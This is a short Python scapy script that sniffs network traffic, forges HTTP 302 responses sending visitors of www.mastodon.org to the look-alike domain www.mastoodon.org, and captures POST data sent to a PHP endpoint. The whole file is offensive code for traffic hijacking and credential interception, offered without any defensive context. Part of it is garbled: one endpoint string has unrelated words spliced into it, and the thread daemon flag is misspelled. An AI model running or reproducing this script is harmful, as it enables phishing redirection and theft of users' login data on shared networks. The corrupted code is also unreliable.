from scapy.all import *

def sniffData(pkt):
    if pkt.haslayer( Raw ):
        header = pkt.getlayer( Raw ).load
        if header.startswith(bytes('GET', 'utf-8')) or header.startswith(bytes('POST', 'utf-8')):
            if bytes('www.mastodon.org', 'utf-8') in header:
                src = pkt.getlayer(IP).src
                dst = pkt.getlayer(IP).dst
                print(src + " / " + dst)
                print(header)
                print('------------------------------------')
                ip = pkt.getlayer(IP)
                tcp = pkt.getlayer(TCP)
                print(tcp)
                redirect_url='www.mastoodon.org'
                http_payload = "HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" % redirect_url
                resp = IP(dst=ip.src, src=ip.dst) / TCP(dport=ip.sport,sport=ip.dport, flags="PA") / Raw(load=http_payload)
                print(ip.src + " / " + ip.dst + " / " + str(ip.dport) + " / " + str(ip.sport))
                print(http_payload)
                sendp(resp, iface="eth0")
                if header.startswith(bytes('POST', 'utf-8')):
                    if bytes('/api/Sercapy send packetvicesConnection.php', 'utf-8') in header:
                        print(header)
                        data = header.split(bytes('\r\n\r\n','utf-8'))[1]
                        print(("[%s] POST data Captured: %s" % (src, data)))
                        print('------------------------------------')
def startSniff():
    sniff(iface="eth0", prn=sniffData)
def launchSniff():
    poison_thread = threading.Thread(target=startSniff, args=())
    poison_thread.deamon = True
    poison_thread.start()